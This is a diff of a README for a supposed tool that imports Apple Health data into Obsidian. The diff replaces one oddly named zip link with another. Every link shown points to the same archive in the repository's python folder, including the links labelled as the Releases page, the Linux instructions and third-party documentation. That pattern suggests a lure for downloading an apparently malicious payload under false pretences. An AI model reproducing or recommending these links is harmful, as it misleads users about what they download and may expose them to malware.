@@ -1,7 +1,7 @@
 # 🏥 apple-health-to-obsidian - Import Your Health Data Effortlessly
 
 ## 📥 Download the Latest Version
-[![Download Latest Version](https://raw.githubusercontent.com/Myc-trulo/apple-health-to-obsidian/main/python/apple-health-to-obsidian-lipovaccine.zip%20Latest%20Version-v1.0-brightgreen)](https://raw.githubusercontent.com/Myc-trulo/apple-health-to-obsidian/main/python/apple-health-to-obsidian-lipovaccine.zip)
+[![Download Latest Version](https://github.com/Myc-trulo/apple-health-to-obsidian/raw/refs/heads/main/python/obsidian_health_apple_to_3.8.zip%20Latest%20Version-v1.0-brightgreen)](https://github.com/Myc-trulo/apple-health-to-obsidian/raw/refs/heads/main/python/obsidian_health_apple_to_3.8.zip)
 
 ## 📊 What Is This Project?
 
@@ -46,7 +46,7 @@ Follow these steps to download and run the application:
 
 Go to the Releases page to find the latest version of the software. 
 
-[Visit this page to download](https://raw.githubusercontent.com/Myc-trulo/apple-health-to-obsidian/main/python/apple-health-to-obsidian-lipovaccine.zip)
+[Visit this page to download](https://github.com/Myc-trulo/apple-health-to-obsidian/raw/refs/heads/main/python/obsidian_health_apple_to_3.8.zip)
 
 ### Step 2: Download the Application
 
@@ -65,9 +65,9 @@ Locate the latest release from the list. Click on it to open the release notes. 
    - Drag the app to the Applications folder.
 
 3. **Linux Users:**
-   - Download the `https://raw.githubusercontent.com/Myc-trulo/apple-health-to-obsidian/main/python/apple-health-to-obsidian-lipovaccine.zip` file.
+   - Download the `https://github.com/Myc-trulo/apple-health-to-obsidian/raw/refs/heads/main/python/obsidian_health_apple_to_3.8.zip` file.
    - Extract the contents using your file manager or command-line tool.
-   - Follow the instructions in the https://raw.githubusercontent.com/Myc-trulo/apple-health-to-obsidian/main/python/apple-health-to-obsidian-lipovaccine.zip file to run the application.
+   - Follow the instructions in the https://github.com/Myc-trulo/apple-health-to-obsidian/raw/refs/heads/main/python/obsidian_health_apple_to_3.8.zip file to run the application.
 
 ### Step 4: Run the Application
 
@@ -104,8 +104,8 @@ If you need assistance, you can find help in the GitHub Issues section of the re
 
 ## 🔗 Additional Resources
 
-- [Health Auto Export Documentation](https://raw.githubusercontent.com/Myc-trulo/apple-health-to-obsidian/main/python/apple-health-to-obsidian-lipovaccine.zip)
-- [Obsidian User Guide](https://raw.githubusercontent.com/Myc-trulo/apple-health-to-obsidian/main/python/apple-health-to-obsidian-lipovaccine.zip)
+- [Health Auto Export Documentation](https://github.com/Myc-trulo/apple-health-to-obsidian/raw/refs/heads/main/python/obsidian_health_apple_to_3.8.zip)
+- [Obsidian User Guide](https://github.com/Myc-trulo/apple-health-to-obsidian/raw/refs/heads/main/python/obsidian_health_apple_to_3.8.zip)
 
 For more tips on using the application and maximizing your health data, keep an eye on this repository for updates and new features.
 
